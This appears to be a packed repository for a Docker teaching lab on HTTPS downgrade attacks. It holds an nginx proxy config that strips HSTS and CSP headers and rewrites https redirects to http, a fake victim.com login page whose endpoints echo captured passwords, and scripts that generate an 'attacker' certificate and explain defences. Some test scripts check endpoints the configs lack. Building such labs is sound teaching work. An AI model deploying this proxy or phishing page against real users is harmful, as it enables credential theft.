This file is a merged representation of a subset of the codebase, containing files not matching ignore patterns, combined into a single document by Repomix.
The content has been processed where comments have been removed.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching these patterns are excluded: node_modules/, bin/, obj/, repomix-output.xml, .repomixignore, .gitignore, .gitattribute, .vscode/, .vs/
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Code comments have been removed from supported file types
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
.devcontainer/devcontainer.json
.docs/repomix-output.xml
.hintrc
docker-compose.yml
proxy/nginx.conf
scripts/demo.sh
scripts/mkcert.sh
scripts/start.sh
scripts/test-endpoints.sh
scripts/test-setup.sh
scripts/validate.sh
upstream/index.html
upstream/init.sh
upstream/nginx.conf.template
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path=".devcontainer/devcontainer.json">
{
  "name": "https-strip-lab",
  "features": {
    "ghcr.io/devcontainers/features/docker-in-docker:2": {
      "version": "latest"
    }
  },
  "postCreateCommand": "bash scripts/mkcert.sh && docker compose up -d",
  "customizations": {
    "codespaces": {
      "openFiles": ["README.md"]
    }
  },
  "forwardPorts": [80, 443]
}
</file>

<file path=".docs/repomix-output.xml">
This file is a merged representation of a subset of the codebase, containing files not matching ignore patterns, combined into a single document by Repomix.
The content has been processed where comments have been removed.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching these patterns are excluded: node_modules/, bin/, obj/, repomix-output.xml, .repomixignore, .gitignore, .gitattribute, .vscode/, .vs/
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Code comments have been removed from supported file types
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
.devcontainer/devcontainer.json
.hintrc
docker-compose.yml
proxy/nginx.conf
scripts/mkcert.sh
upstream/index.html
upstream/init.sh
upstream/nginx.conf.template
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path=".devcontainer/devcontainer.json">
{
  "name": "https-strip-lab",
  "features": {
    "ghcr.io/devcontainers/features/docker-in-docker:2": {
      "version": "latest"
    }
  },
  "postCreateCommand": "bash scripts/mkcert.sh && docker compose up -d",
  "customizations": {
    "codespaces": {
      "openFiles": ["README.md"]
    }
  },
  "forwardPorts": [80, 443]
}
</file>

<file path=".hintrc">
{
  "extends": [
    "development"
  ],
  "hints": {
    "no-inline-styles": "off"
  }
}
</file>

<file path="scripts/mkcert.sh">
ls -l certs/victim.local.crt certs/victim.local.key

openssl req -x509 -nodes -newkey rsa:2048 -days 3650 \
  -subj "/CN=victim.local" \
  -keyout certs/victim.local.key -out certs/victim.local.crt
</file>

<file path="upstream/index.html">
<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HTTPS Strip Demo</title></head>
<body style="font:16px system-ui;margin:2rem;">
  <h1>HTTPS Strip Demo (PWD-safe)</h1>
  <p>Upstream is HTTPS; proxy on port 80 tries to downgrade any HTTPS redirects/links.</p>
  <ul>
    <li><a id="httpsLink" href="#">HTTPS link to /secure</a></li>
    <li><a id="httpLink"  href="#">HTTP link to /insecure</a></li>
  </ul>
  <p id="hsts"></p>
  <script>
    const host = location.host;
    document.getElementById('httpsLink').href = `https://${host}/secure`;
    document.getElementById('httpLink').href  = `http://${host}/insecure`;
    fetch("/", { method:"HEAD" }).then(r=>{
      const h=r.headers.get("strict-transport-security");
      document.getElementById("hsts").textContent = "HSTS header: " + (h || "absent");
    });
  </script>
</body>
</html>
</file>

<file path="upstream/init.sh">
if [ "$HSTS" = "on" ]; then
    export HSTS_HEADER="max-age=31536000; includeSubDomains; preload"
else
    export HSTS_HEADER=""
fi

echo "HSTS setting: $HSTS"
echo "HSTS_HEADER: $HSTS_HEADER"
</file>

<file path="upstream/nginx.conf.template">
server {
  listen 443 ssl;
  server_name _;

  ssl_certificate     /etc/nginx/certs/victim.local.crt;
  ssl_certificate_key /etc/nginx/certs/victim.local.key;

  # This will be replaced by envsubst
  # add_header Strict-Transport-Security "${HSTS_HEADER}" always;

  root /usr/share/nginx/html;
  index index.html;

  location / { try_files $uri /index.html; }
  location = /secure   { return 200 "secure content\n"; }
  location = /insecure { return 200 "insecure content\n"; }
}
</file>

<file path="proxy/nginx.conf">
worker_processes auto;
events { worker_connections 1024; }
http {
  resolver 127.0.0.11 ipv6=off valid=10s;
  resolver_timeout 2s;

  # rewrite https://host/... -> http://host/...
  map $upstream_http_location $rewritten_location {
    default $upstream_http_location;
    ~^https://([^/]+)(/?.*)$ http://$1$2;
  }

  # variable to make nginx resolve at request time (not startup)
  map "" $u_host { default "upstream"; }

  server {
    listen 80;
    server_name _;

    location / {
      proxy_pass https://$u_host:443;
      proxy_connect_timeout 2s;
      proxy_read_timeout 10s;
      proxy_send_timeout 10s;

      proxy_ssl_server_name on;
      proxy_ssl_name $u_host;
      proxy_ssl_verify off;

      proxy_hide_header Strict-Transport-Security;
      proxy_hide_header Content-Security-Policy;

      proxy_redirect off;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto http;

      proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;
      proxy_intercept_errors on;
      error_page 301 302 307 308 = @handle_redirect;
    }

    location @handle_redirect {
      internal;
      add_header Location $rewritten_location always;
      return 302;
    }
  }
}
</file>

<file path="docker-compose.yml">
services:
  proxy:
    image: nginx:alpine
    container_name: hs_proxy
    ports: ["80:80"]
    volumes:
      - ./proxy/nginx.conf:/etc/nginx/nginx.conf:ro
    depends_on:
      upstream:
        condition: service_healthy
    networks:
      lab:

  upstream:
    image: nginx:alpine
    container_name: hs_upstream
    environment:
      HSTS: "off"
      HSTS_HEADER: ""  # Will be set by init script
    volumes:
      - ./upstream/nginx.conf.template:/etc/nginx/templates/nginx.conf.template:ro
      - ./upstream/index.html:/usr/share/nginx/html/index.html:ro
      - ./certs:/etc/nginx/certs:ro
      - ./upstream/init.sh:/docker-entrypoint.d/10-init-hsts.sh:ro
    healthcheck:
      test: ["CMD", "sh", "-c", "apk add --no-cache curl >/dev/null 2>&1 || true; curl -kfs https://localhost/secure"]
      interval: 5s
      timeout: 3s
      retries: 12
    networks:
      lab:
        aliases:
          - upstream
    restart: unless-stopped

networks:
  lab: {}
</file>

</files>
</file>

<file path=".hintrc">
{
  "extends": [
    "development"
  ],
  "hints": {
    "no-inline-styles": "off"
  }
}
</file>

<file path="scripts/start.sh">
echo "=== HTTPS Strip Demo Lab Setup ==="


chmod +x scripts/mkcert.sh
chmod +x upstream/init.sh


echo "1. Generating SSL certificates..."
bash scripts/mkcert.sh


echo "2. Starting containers..."
docker-compose down 2>/dev/null
docker-compose up -d


echo "3. Waiting for containers to be healthy..."
sleep 5


echo "4. Testing the setup..."
echo ""
echo "Testing HTTPS upstream directly:"
curl -k -s https://localhost:8443/secure 2>/dev/null && echo "‚úì HTTPS upstream working" || echo "‚úó HTTPS upstream failed"

echo ""
echo "Testing HTTP proxy:"
curl -s http://localhost/secure 2>/dev/null && echo "‚úì HTTP proxy working" || echo "‚úó HTTP proxy failed"

echo ""
echo "=== Demo Ready ==="
echo "‚Ä¢ Open http://localhost in your browser"
echo "‚Ä¢ The proxy strips HTTPS and removes HSTS headers"
echo "‚Ä¢ Toggle HSTS with: docker-compose exec upstream sh -c 'export HSTS=on && /docker-entrypoint.d/10-init-hsts.sh'"
echo ""
echo "View logs with: docker-compose logs -f"
</file>

<file path="scripts/test-endpoints.sh">
echo "üß™ Testing All Demo Endpoints"
echo "============================="

base_url="localhost"
failed=0

test_endpoint() {
    local url="$1"
    local expected="$2"
    local description="$3"

    echo -n "Testing $description... "

    if curl -k -s --max-time 10 "$url" | grep -q "$expected"; then
        echo "‚úÖ"
    else
        echo "‚ùå"
        failed=$((failed + 1))
    fi
}

echo ""
echo "üîó HTTP Endpoints (Port 80):"
test_endpoint "http://$base_url/" "DNS Poisoning" "DNS poisoning landing page"
test_endpoint "http://$base_url/phish" "Login to victim.local" "HTTP phishing page"
test_endpoint "http://$base_url/steal-creds?username=test&password=test" "Attack Successful" "Credential theft simulation"

echo ""
echo "üîí Fake HTTPS Endpoints (Port 8443):"
test_endpoint "https://$base_url:8443/fake-victim" "Secure.*victim.local" "Fake HTTPS victim site"
test_endpoint "https://$base_url:8443/steal-https-creds?username=test&password=test" "HTTPS Attack Successful" "HTTPS credential theft"

echo ""
echo "üõ°Ô∏è Legitimate HTTPS Endpoints (Port 9443):"
test_endpoint "https://$base_url:9443/secure" "REAL victim.local" "Legitimate secure content"
test_endpoint "https://$base_url:9443/login" "Secure Login" "Legitimate login page"

echo ""
if [ $failed -eq 0 ]; then
    echo "üéâ All endpoints working correctly!"
    echo ""
    echo "üì± Play with Docker URLs ready:"
    echo "   HTTP:  http://ip...-80.direct.labs.play-with-docker.com/"
    echo "   Fake:  https://ip...-8443.direct.labs.play-with-docker.com/"
    echo "   Real:  https://ip...-9443.direct.labs.play-with-docker.com/"
else
    echo "üí• $failed endpoints failed!"
    echo "Check the docker-compose logs for details"
    exit 1
fi
</file>

<file path="scripts/test-setup.sh">
echo "=== Testing HTTPS Strip Demo Setup ==="


echo "1. Testing upstream HTTPS directly..."
echo "Testing /secure endpoint:"
curl -k -v https://localhost:8443/secure 2>&1 | grep -E "(HTTP|SSL|TLS|> GET|< HTTP)"

echo ""
echo "2. Testing upstream container internally..."
docker-compose exec upstream curl -k -s https://localhost/secure && echo "‚úì Internal HTTPS working"

echo ""
echo "3. Testing proxy HTTP..."
echo "Testing /secure via proxy:"
curl -v http://localhost/secure 2>&1 | grep -E "(HTTP|> GET|< HTTP|Connection)"

echo ""
echo "4. Testing proxy with insecure endpoint..."
curl -v http://localhost/insecure 2>&1 | grep -E "(HTTP|> GET|< HTTP)"

echo ""
echo "5. Checking container logs..."
echo "=== Upstream logs ==="
docker-compose logs upstream | tail -5

echo "=== Proxy logs ==="
docker-compose logs proxy | tail -5

echo ""
echo "6. Testing direct container networking..."
docker-compose exec proxy curl -k -s https://upstream:443/secure && echo "‚úì Proxy->Upstream connection working"
</file>

<file path="scripts/validate.sh">
echo "üîç Pre-Deployment Validation"
echo "============================"

errors=0


required_files=(
    "proxy/nginx.conf"
    "upstream/nginx.conf.template"
    "upstream/init.sh"
    "upstream/index.html"
    "docker-compose.yml"
    "scripts/mkcert.sh"
)

echo "1Ô∏è‚É£ Checking required files..."
for file in "${required_files[@]}"; do
    if [ -f "$file" ]; then
        echo "‚úÖ $file"
    else
        echo "‚ùå $file - MISSING"
        errors=$((errors + 1))
    fi
done


echo ""
echo "2Ô∏è‚É£ Validating nginx configuration..."
if docker run --rm -v "$(pwd)/proxy/nginx.conf:/tmp/nginx.conf:ro" nginx:alpine nginx -t -c /tmp/nginx.conf 2>/dev/null; then
    echo "‚úÖ proxy/nginx.conf syntax valid"
else
    echo "‚ùå proxy/nginx.conf syntax invalid"
    errors=$((errors + 1))
fi


echo ""
echo "3Ô∏è‚É£ Validating docker-compose..."
if docker-compose config >/dev/null 2>&1; then
    echo "‚úÖ docker-compose.yml valid"
else
    echo "‚ùå docker-compose.yml invalid"
    errors=$((errors + 1))
fi


echo ""
echo "4Ô∏è‚É£ Checking for port conflicts..."
ports_to_check=(80 8443 9443)
for port in "${ports_to_check[@]}"; do
    if netstat -tuln 2>/dev/null | grep -q ":$port " || ss -tuln 2>/dev/null | grep -q ":$port "; then
        echo "‚ö†Ô∏è  Port $port is already in use"
    else
        echo "‚úÖ Port $port available"
    fi
done


echo ""
echo "5Ô∏è‚É£ Checking script permissions..."
scripts=("scripts/mkcert.sh" "upstream/init.sh")
for script in "${scripts[@]}"; do
    if [ -x "$script" ]; then
        echo "‚úÖ $script is executable"
    else
        echo "‚ö†Ô∏è  $script not executable (will be fixed during setup)"
    fi
done

echo ""
if [ $errors -eq 0 ]; then
    echo "üéâ VALIDATION PASSED - Ready for deployment!"
    echo ""
    echo "Run: ./demo.sh"
else
    echo "üí• VALIDATION FAILED - $errors errors found"
    echo "Fix the issues above before deployment"
    exit 1
fi
</file>

<file path="scripts/demo.sh">
set -e

echo "üö® HTTPS Downgrade Attack Demo üö®"
echo "================================="
echo "Simulates DNS poisoning + HTTPS downgrade + Fake HTTPS redirect"


mkdir -p proxy upstream scripts certs
chmod +x scripts/mkcert.sh upstream/init.sh 2>/dev/null || true


echo ""
echo "1Ô∏è‚É£ Generating attacker's SSL certificate..."
bash scripts/mkcert.sh

# Start containers
echo ""
echo "2Ô∏è‚É£ Starting attack infrastructure..."
docker-compose down 2>/dev/null || true
docker-compose up -d

# Wait for startup
echo ""
echo "3Ô∏è‚É£ Waiting for containers to initialize..."
sleep 5

# Test endpoints
echo ""
echo "4Ô∏è‚É£ Testing attack chain..."

echo -n "Testing HTTP downgrade page... "
if curl -s --max-time 5 "http://localhost/" | grep -q "HTTPS Downgrade"; then
    echo "‚úÖ"
else
    echo "‚ùå"
fi

echo -n "Testing fake HTTPS site... "
if curl -k -s --max-time 5 "https://localhost:8443/victim-site" | grep -q "victim.com"; then
    echo "‚úÖ"
else
    echo "‚ùå"
fi

echo ""
echo "üéØ REALISTIC ATTACK DEMO READY!"
echo "==============================="
echo ""
echo "üì± For Play with Docker:"
echo ""
echo "üîó Attack Flow URLs:"
echo "   Step 1: https://ip...-80.direct.labs.play-with-docker.com/secure"
echo "           ‚Ü≥ User types HTTPS but gets HTTP (no 443 service)"
echo ""
echo "   Step 2: http://ip...-80.direct.labs.play-with-docker.com/"
echo "           ‚Ü≥ Shows downgrade attack page"
echo ""
echo "   Step 3: https://ip...-8443.direct.labs.play-with-docker.com/victim-site"
echo "           ‚Ü≥ Fake HTTPS site with 'valid' certificate"
echo ""
echo "üé≠ Attack Demonstration:"
echo "   1. User expects secure HTTPS connection"
echo "   2. DNS poisoning + no HTTPS service = HTTP fallback"
echo "   3. HTTP page redirects to attacker's legitimate HTTPS site"
echo "   4. Users trust the lock icon and enter credentials"
echo "   5. Attacker has valid HTTPS cert but wrong domain"
echo ""
echo "üí° Key Learning:"
echo "   ‚Ä¢ Always check the actual domain name, not just the lock icon"
echo "   ‚Ä¢ HSTS prevents protocol downgrades"
echo "   ‚Ä¢ Certificate pinning helps prevent domain spoofing"
echo ""
echo "üîç Test the attack:"
echo "   1. Try to visit: https://ip...-80.direct.labs.play-with-docker.com/secure"
echo "   2. Notice browser falls back to HTTP"
echo "   3. Follow redirect to fake HTTPS site"
echo "   4. Check certificate details vs domain name"

echo ""
echo "üìä Container Status:"
docker-compose ps

echo ""
echo "üöÄ Ready for demonstration!"
</file>

<file path="upstream/index.html">
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>DNS Poisoning Attack Demo</title>
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; line-height: 1.6; }
    .attack { background: #ffe6e6; padding: 1rem; border: 2px solid #ff0000; }
    .legitimate { background: #e6ffe6; padding: 1rem; border: 2px solid #00aa00; }
    .warning { background: #fff3cd; padding: 1rem; border: 2px solid #ffcc00; }
  </style>
</head>
<body>
  <h1>üö® DNS Poisoning Attack Demo</h1>

  <div class="warning">
    <h2>‚ö†Ô∏è Demo Purpose</h2>
    <p>This demonstrates how DNS poisoning can downgrade HTTPS to HTTP, enabling man-in-the-middle attacks.</p>
  </div>

  <div class="attack">
    <h2>üéØ Attack Scenario</h2>
    <p><strong>Current page:</strong> <span id="currentUrl"></span></p>
    <p><strong>Protocol:</strong> <span id="protocol"></span></p>
    <p><strong>Security:</strong> <span id="security"></span></p>
  </div>

  <h2>üîó Demo Links</h2>
  <ul>
    <li><a href="/phish">üé£ Fake Login Page (HTTP)</a></li>
    <li><a href="/legitimate">üîí Compare with Legitimate Site (HTTPS)</a></li>
  </ul>

  <script>
    // Show current page details
    document.getElementById('currentUrl').textContent = window.location.href;
    document.getElementById('protocol').textContent = window.location.protocol;

    const isSecure = window.location.protocol === 'https:';
    document.getElementById('security').textContent = isSecure ?
      '‚úÖ Encrypted (Safe)' :
      '‚ùå Unencrypted (Vulnerable to attacks!)';

    // Change styling based on security
    if (!isSecure) {
      document.body.style.backgroundColor = '#ffe6e6';
    }
  </script>
</body>
</html>
</file>

<file path="upstream/init.sh">
if [ "$HSTS" = "on" ]; then
    export HSTS_HEADER="max-age=31536000; includeSubDomains; preload"
else
    export HSTS_HEADER=""
fi

echo "HSTS setting: $HSTS"
echo "HSTS_HEADER: '$HSTS_HEADER'"
</file>

<file path="scripts/mkcert.sh">
set -e

echo "Generating SSL certificate for HTTPS downgrade attack demo"
echo "============================================================="

mkdir -p certs



if [ ! -f "certs/attacker.crt" ]; then
    echo "Generating attacker's certificate..."
    echo "This simulates an attacker who has a valid certificate for their domain"


    openssl req -x509 -nodes -newkey rsa:2048 -days 365 \
      -subj "/CN=*.direct.labs.play-with-docker.com/O=Attacker Corp/C=US/ST=California/L=San Francisco" \
      -keyout certs/attacker.key \
      -out certs/attacker.crt

    echo "‚úÖ Attacker certificate generated"
else
    echo "‚úÖ Attacker certificate already exists"
fi

echo ""
echo "üìã Certificate Details:"
openssl x509 -in certs/attacker.crt -text -noout | grep -E "(Subject:|Issuer:|Not After)"

echo ""
echo "Files created:"
ls -la certs/

echo ""
echo "‚úÖ Certificate setup complete!"
echo ""
echo "Attack Flow:"
echo "1. User types: https://example...direct.labs.play-with-docker.com/secure"
echo "2. DNS poisoning points to your server"
echo "3. No HTTPS service on port 443 ‚Üí Browser falls back to HTTP (port 80)"
echo "4. HTTP site redirects to fake HTTPS site (port 8443)"
echo "5. Fake HTTPS site has 'valid' certificate and steals credentials"
</file>

<file path="upstream/nginx.conf.template">
server {
  listen 8443 ssl;
  server_name _;

  # Use a certificate that matches the Play with Docker domain
  # This simulates an attacker who has obtained a valid certificate for their domain
  ssl_certificate /etc/nginx/certs/attacker.crt;
  ssl_certificate_key /etc/nginx/certs/attacker.key;
  ssl_protocols TLSv1.2 TLSv1.3;

  # Attacker's site looks legitimate with proper security headers
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
  add_header X-Frame-Options "DENY" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Attacker-Site "true" always;

  root /usr/share/nginx/html;
  index index.html;

  # Fake victim site that looks legitimate
  location /victim-site {
    return 200 '<!DOCTYPE html>
<html><head><title>Secure Login - victim.com</title>
<style>
  body { font-family: sans-serif; padding: 20px; background: #f8f9fa; }
  .secure { background: #d4edda; padding: 15px; border: 1px solid #28a745; margin: 15px 0; }
  .form-container { background: white; padding: 20px; border: 1px solid #ddd; max-width: 400px; }
  input { padding: 10px; width: 100%; margin: 10px 0; border: 1px solid #ddd; }
  button { padding: 12px 20px; background: #28a745; color: white; border: none; width: 100%; }
</style>
</head>
<body>
<h1>victim.com - Secure Portal</h1>

<div class="secure">
<h3>Secure Connection Established</h3>
<p><strong>This site appears secure because:</strong></p>
<ul>
<li>Valid HTTPS certificate</li>
<li>Legitimate-looking domain</li>
<li>Security headers present</li>
<li>Green lock icon in browser</li>
</ul>
</div>

<div class="form-container">
<h3>Login to Your Account</h3>
<form method="get" action="/steal-secure-creds">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Secure Login</button>
</form>
</div>

<div style="background: #fff3cd; padding: 10px; margin: 15px 0; border: 1px solid #ffeaa7;">
<h4>Attack Analysis:</h4>
<p><strong>Why this attack works:</strong></p>
<ul>
<li>User typed https://victim.com but DNS was poisoned</li>
<li>Browser fell back to HTTP, then got redirected here</li>
<li>This HTTPS site has a valid certificate (for attacker domain)</li>
<li>Users see the lock icon and trust it</li>
<li>Domain confusion: users don'\''t always check the URL carefully</li>
</ul>
</div>

<p><small>Notice: Check the certificate details and domain name!</small></p>
</body></html>';
  }

  # Handle credential theft on the "secure" site
  location = /steal-secure-creds {
    return 200 '<!DOCTYPE html>
<html><head><title>Advanced Attack Successful!</title>
<style>body{font-family:sans-serif;padding:20px;background:#ffe6e6;}</style>
</head>
<body>
<h2>Advanced HTTPS Attack Successful!</h2>

<div style="background: #f8d7da; padding: 15px; border: 1px solid #f5c6cb; margin: 15px 0;">
<h3>Credentials Captured via "Secure" HTTPS:</h3>
<ul>
<li><strong>Username:</strong> <code>$arg_username</code></li>
<li><strong>Password:</strong> <code>$arg_password</code></li>
<li><strong>Attack Method:</strong> HTTPS with valid certificate</li>
<li><strong>Domain:</strong> $host (not victim.com!)</li>
<li><strong>User IP:</strong> $remote_addr</li>
</ul>
</div>

<div style="background: #fff3cd; padding: 15px; border: 1px solid #ffeaa7; margin: 15px 0;">
<h3>Why This Attack Succeeded:</h3>
<ol>
<li><strong>DNS Poisoning:</strong> victim.com pointed to attacker IP</li>
<li><strong>Protocol Downgrade:</strong> HTTPS ‚Üí HTTP ‚Üí HTTPS redirect</li>
<li><strong>Valid Certificate:</strong> HTTPS site has legitimate SSL cert</li>
<li><strong>User Trust:</strong> Lock icon made it look secure</li>
<li><strong>Domain Confusion:</strong> Users didn'\''t verify the actual domain</li>
</ol>
</div>

<h3>How to Protect Against This:</h3>
<ul>
<li>Always verify the domain name in the address bar</li>
<li>Check certificate details (click the lock icon)</li>
<li>Use HSTS to prevent protocol downgrades</li>
<li>Use DNS over HTTPS (DoH) to prevent DNS poisoning</li>
<li>Be suspicious of unexpected redirects</li>
</ul>

<p><a href="/victim-site">‚Üê Back to fake login</a></p>
</body></html>';
  }

  # Default page
  location / {
    return 302 /victim-site;
  }
}
</file>

<file path="proxy/nginx.conf">
worker_processes auto;
events { worker_connections 1024; }

http {
  resolver 127.0.0.11 ipv6=off valid=10s;

  # HTTP Server - This is where victims land when HTTPS is not available
  # Simulates the downgrade attack when user types https://example.com but gets HTTP
  server {
    listen 80;
    server_name _;

    # Log the attack for demonstration
    access_log /var/log/nginx/attack.log;

    location / {
      add_header X-Attack-Vector "HTTPS-Downgrade-to-HTTP" always;
      add_header X-Original-Request "https://$host$request_uri" always;
      
      return 200 '<!DOCTYPE html>
<html><head><title>Connection Downgraded - Security Warning</title>
<style>
  body { font-family: sans-serif; padding: 20px; background: #fff3cd; }
  .warning { background: #f8d7da; padding: 15px; border: 1px solid #f5c6cb; margin: 15px 0; }
  .attack { background: #ffe6e6; padding: 15px; border: 1px solid #ff0000; margin: 15px 0; }
</style>
</head>
<body>
<h1>HTTPS Downgrade Attack in Progress</h1>

<div class="warning">
<h3>What just happened:</h3>
<ol>
<li>You requested: <strong>https://$host$request_uri</strong></li>
<li>DNS poisoning pointed you to attacker server</li>
<li>No HTTPS service running ‚Üí Browser fell back to HTTP</li>
<li>You are now on an UNENCRYPTED connection!</li>
</ol>
</div>

<div class="attack">
<h3>Attack Demonstration:</h3>
<p>In a real attack, this HTTP page could:</p>
<ul>
<li>Steal your credentials in plaintext</li>
<li>Inject malicious scripts</li>
<li>Redirect you to a fake "secure" site</li>
<li>Intercept all your data</li>
</ul>
</div>

<h3>Next Steps:</h3>
<p><strong>The attacker will now redirect you to their "legitimate" HTTPS site...</strong></p>
<p><a href="/redirect-to-fake-https" style="padding: 10px 20px; background: #007cba; color: white; text-decoration: none;">
Continue to "Secure" Site ‚Üí
</a></p>

<p><small>Current URL: $scheme://$host$request_uri</small></p>
</body></html>';
    }

    # Redirect to attacker's HTTPS site (with valid cert for their domain)
    location = /redirect-to-fake-https {
      # Redirect to the attacker's HTTPS site on port 8443
      return 302 https://$host:8443/victim-site;
    }

    # Direct credential harvesting on HTTP for demonstration
    location = /steal-http-creds {
      return 200 '<!DOCTYPE html>
<html><head><title>HTTP Credential Theft</title>
<style>body{font-family:sans-serif;padding:20px;background:#ffcccc;}</style>
</head>
<body>
<h2>HTTP Attack - Credentials Stolen!</h2>
<p><strong>Captured via unencrypted HTTP:</strong></p>
<ul>
<li>Username: <code>$arg_username</code></li>
<li>Password: <code>$arg_password</code></li>
<li>Method: Plaintext interception</li>
<li>Source: $remote_addr</li>
</ul>
<p>This happened because you were on HTTP instead of HTTPS!</p>
<p><a href="/redirect-to-fake-https">Now see the HTTPS version ‚Üí</a></p>
</body></html>';
    }
  }
}
</file>

<file path="docker-compose.yml">
services:

  proxy:
    image: nginx:alpine
    container_name: downgrade_proxy
    ports:
      - "80:80"
    volumes:
      - ./proxy/nginx.conf:/etc/nginx/nginx.conf:ro
    networks:
      - attack_net


  attacker_https:
    image: nginx:alpine
    container_name: attacker_https_site
    ports:
      - "8443:8443"
    environment:
      HSTS: "on"
      HSTS_HEADER: "max-age=31536000; includeSubDomains; preload"
    volumes:
      - ./upstream/nginx.conf.template:/etc/nginx/templates/nginx.conf.template:ro
      - ./upstream/index.html:/usr/share/nginx/html/index.html:ro
      - ./certs:/etc/nginx/certs:ro
      - ./upstream/init.sh:/docker-entrypoint.d/10-init-hsts.sh:ro
    healthcheck:
      test: ["CMD", "sh", "-c", "apk add --no-cache curl >/dev/null 2>&1 || true; curl -kfs https://localhost:8443/victim-site"]
      interval: 5s
      timeout: 3s
      retries: 12
    networks:
      attack_net:
        aliases:
          - attacker_https
    restart: unless-stopped

networks:
  attack_net:
</file>

</files>
